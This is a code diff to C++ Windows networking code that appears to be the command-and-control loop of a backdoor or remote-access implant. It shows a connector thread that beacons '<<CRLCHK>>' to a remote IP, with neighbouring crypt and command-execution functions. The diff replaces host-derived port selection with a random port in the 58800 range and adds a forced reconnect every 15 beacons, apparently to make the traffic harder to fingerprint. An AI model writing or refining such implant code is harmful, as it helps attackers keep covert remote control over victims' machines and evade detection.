@@ -42,34 +42,6 @@ void crypt(char *m, size_t len) {
 	}
 }
 
-int getLastOctet()
-{
-	char szBuffer[1024];
-	WSADATA wsaData;
-	WORD wVersionRequested = MAKEWORD(2, 0);
-	if (WSAStartup(wVersionRequested, &wsaData) != 0)
-		return 0;
-
-	if (gethostname(szBuffer, sizeof(szBuffer)) == SOCKET_ERROR)
-	{
-		WSACleanup();
-		return 0;
-	}
-
-	struct hostent *host = gethostbyname(szBuffer);
-	if (host == NULL)
-	{
-		WSACleanup();
-		return 0;
-	}
-
-	int last_octet = ((struct in_addr *)(host->h_addr))->S_un.S_un_b.s_b3 * 10;
-	last_octet += ((struct in_addr *)(host->h_addr))->S_un.S_un_b.s_b4;
-
-	WSACleanup();
-	return last_octet;
-}
-
 void exec2(cmdcall *p)
 {
 	cmdcall *args = NULL;
@@ -153,11 +125,14 @@ static DWORD WINAPI connector(void *params)
 	int recvLen, recvTot, iResult;
 	int nError = 0;
 	DWORD lastBeacon = 0;
+	int rekey = 0;
 
 	std::string sendq;
 
 	u_long noblock = 1;
 	u_long block = 1;
+
+	srand(time(NULL));
 
 	while (running) {
 
@@ -176,7 +151,7 @@ static DWORD WINAPI connector(void *params)
 			continue;
 		}
 
-		int port = 58800 + getLastOctet();
+		int port = 58800 + (rand() % 250);
 		addr.sin_family = AF_INET;
 		addr.sin_port = htons(port);
 		addr.sin_addr.S_un.S_addr = inet_addr(ip.c_str());
@@ -200,6 +175,13 @@ static DWORD WINAPI connector(void *params)
 		ready = true;
 		while (running && ready) {
 			if (sendq.length() == 0 && GetTickCount() - lastBeacon > 10000) {
+				if (rekey > 15) {
+					closesocket(sock);
+					ready = false;
+					rekey = 0;
+					continue;
+				}
+				rekey++;
 				lastBeacon = GetTickCount();
 				sendq = "<<CRLCHK>>";
 			}
